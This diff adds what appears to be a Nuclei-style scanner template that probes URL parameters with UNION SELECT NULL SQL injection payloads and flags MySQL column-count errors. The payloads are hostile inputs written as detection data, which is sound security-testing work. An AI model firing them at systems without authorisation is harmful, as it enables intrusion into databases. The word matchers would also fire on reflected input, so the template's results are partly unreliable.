@@ -1,0 +1,40 @@
+id: sql-injection-union-based
+
+info:
+  name: SQL Injection - UNION Based
+  author: Kalkaneus Team
+  severity: high
+  description: Detects SQL injection vulnerabilities using UNION-based techniques
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  tags: sqli,union,injection,database
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{Path}} UNION SELECT NULL--"
+      - "{{BaseURL}}{{Path}} UNION SELECT NULL,NULL--"
+      - "{{BaseURL}}{{Path}} UNION SELECT NULL,NULL,NULL--"
+      - "{{BaseURL}}{{Path}}' UNION SELECT NULL--"
+      - "{{BaseURL}}{{Path}}' UNION SELECT NULL,NULL--"
+      - "{{BaseURL}}{{Path}}' UNION SELECT NULL,NULL,NULL--"
+    
+    payloads:
+      Path:
+        - "?id=1"
+        - "?cat=1"
+        - "?artist=1"
+        - "?page=1"
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "UNION"
+          - "SELECT"
+        condition: and
+        
+      - type: regex
+        regex:
+          - "The used SELECT statements have a different number of columns"
+          - "UNION.*SELECT"
